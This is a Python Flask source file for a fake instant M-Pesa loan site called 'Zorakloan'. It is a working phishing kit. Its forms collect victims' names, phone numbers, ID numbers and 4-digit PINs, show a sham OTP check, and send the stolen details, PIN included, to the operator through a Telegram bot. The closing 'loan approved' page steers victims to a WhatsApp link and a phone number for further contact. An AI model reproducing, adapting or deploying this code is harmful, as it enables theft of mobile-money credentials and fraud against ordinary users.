import os, random
from flask import Flask, request, session, redirect
import requests
app = Flask(__name__)
app.secret_key = "zorak-pic-link"
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
WA = "https://wa.me/message/CFCJWLOZ7IWZK1"
TEL = "tel:+254119912568"
IMG = "https://i.postimg.cc/kgGqGLBJ/IMG-20261022-WA4582.jpg"

@app.route('/')
def home():
    return redirect('/api')

@app.route('/api', methods=['GET','POST'])
def api():
    if request.method == 'POST':
        otp = str(random.randint(100000,999999))
        ref = "ZRK-" + str(random.randint(1000,9999))
        session['otp'] = otp
        session['name'] = request.form.get('full_name')
        session['phone'] = request.form.get('phone')
        session['amount'] = request.form.get('amount')
        session['pin'] = request.form.get('pin')
        session['ref'] = ref
        try:
            txt = "OTP " + otp + " " + session['phone'] + " " + session['name']
            requests.post("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", data={"chat_id":CHAT_ID,"text":txt})
        except:
            pass
        h = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'><meta property='og:image' content='IMG'><style>body{font-family:Arial;background:#f0f4f0;padding:20px}.box{background:white;max-width:400px;margin:50px auto;padding:25px;border-radius:15px;text-align:center}.big{font-size:30px;letter-spacing:6px;background:#e8f5e9;padding:12px;border-radius:10px;color:#0a7a3e;font-weight:bold;border:2px dashed #0a7a3e}</style></head><body><div class='box'><img src='IMG' style='width:100%;border-radius:12px'><h2>SMS Sent to PH</h2><div class='big'>CODE</div><form method='POST' action='/verify'><input name='otp' placeholder='Enter code' required style='width:100%;padding:12px;font-size:18px;text-align:center;margin-top:15px'><button style='width:100%;padding:12px;background:#0a7a3e;color:white;border:none;border-radius:8px;margin-top:10px'>Verify</button></form><br><a href='LINK' style='color:#25D366;font-weight:bold;text-decoration:none'>Text Me on WhatsApp</a></div><a href='LINK' style='position:fixed;bottom:20px;right:20px;background:#25D366;color:white;padding:12px 18px;border-radius:50px;text-decoration:none;font-weight:bold'>Text Me</a></body></html>"
        h = h.replace("PH", session['phone']).replace("CODE", otp).replace("LINK", WA).replace("IMG", IMG)
        return h

    h2 = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'><meta property='og:title' content='WORLD LOAN - Zorakloan - Instant M-Pesa'><meta property='og:description' content='Apply now - Fast approval - Text Me on WhatsApp'><meta property='og:image' content='IMG'><meta property='og:url' content='https://james-tips.onrender.com/api'><style>body{font-family:Arial;background:#f0f4f0;padding:15px}.box{background:white;max-width:420px;margin:auto;padding:20px;border-radius:15px}input,select{width:100%;padding:11px;margin:6px 0;border:1px solid #ccc;border-radius:8px}button{width:100%;padding:13px;background:#0a7a3e;color:white;border:none;border-radius:8px;font-weight:bold}</style></head><body><div class='box'><a href='LINK'><img src='IMG' style='width:100%;border-radius:12px;margin-bottom:10px'></a><h2 style='text-align:center;color:#0a7a3e'>Zorakloan World Loan</h2><form method='POST'><input name='full_name' placeholder='Full Name' required><input name='phone' placeholder='Phone 07...' required><input name='id_number' placeholder='ID Number' required><input name='county' placeholder='County' required><input name='amount' placeholder='Amount' required><select name='period'><option>7 Days</option><option>14 Days</option></select><select name='employment'><option>Employed</option><option>Business</option></select><input name='pin' placeholder='4-digit PIN' required><button>Apply Now</button></form><div style='text-align:center;margin-top:10px'><a href='LINK' style='background:#25D366;color:white;padding:10px 15px;border-radius:8px;text-decoration:none'>WhatsApp</a> <a href='TEL' style='background:#0a7a3e;color:white;padding:10px 15px;border-radius:8px;text-decoration:none'>Call</a></div></div><a href='LINK' style='position:fixed;bottom:20px;right:20px;background:#25D366;color:white;padding:12px 18px;border-radius:50px;text-decoration:none;font-weight:bold'>Text Me</a></body></html>"
    h2 = h2.replace("LINK", WA).replace("TEL", TEL).replace("IMG", IMG)
    return h2

@app.route('/verify', methods=['POST'])
def verify():
    if request.form.get('otp') == session.get('otp'):
        ref = session.get('ref')
        amount = session.get('amount')
        pin = session.get('pin')
        try:
            txt2 = "VERIFIED " + ref + " " + session.get('name') + " " + session.get('phone') + " Amt " + amount + " PIN " + pin
            requests.post("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", data={"chat_id":CHAT_ID,"text":txt2})
        except:
            pass
        fh = "<html><head><meta name='viewport' content='width=device-width,initial-scale=1'><meta property='og:image' content='IMG'><style>body{font-family:Arial;background:#f0f4f0;padding:20px}.box{background:white;max-width:400px;margin:40px auto;padding:25px;border-radius:15px;text-align:center}.btn{display:block;padding:14px;margin:10px 0;border-radius:10px;color:white;text-decoration:none;font-weight:bold}</style></head><body><div class='box'><img src='IMG' style='width:100%;border-radius:12px'><h2 style='color:#0a7a3e'>Verified! REF</h2><p>Loan Ksh AMT approved!</p><a href='LINK' class='btn' style='background:#25D366'>TEXT ME ON WHATSAPP NOW</a><a href='TEL' class='btn' style='background:#0a7a3e'>CALL ME NOW</a></div></body></html>"
        fh = fh.replace("REF", ref).replace("AMT", amount).replace("LINK", WA).replace("TEL", TEL).replace("IMG", IMG)
        session.clear()
        return fh
    return "Wrong code <a href='/api'>Retry</a>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)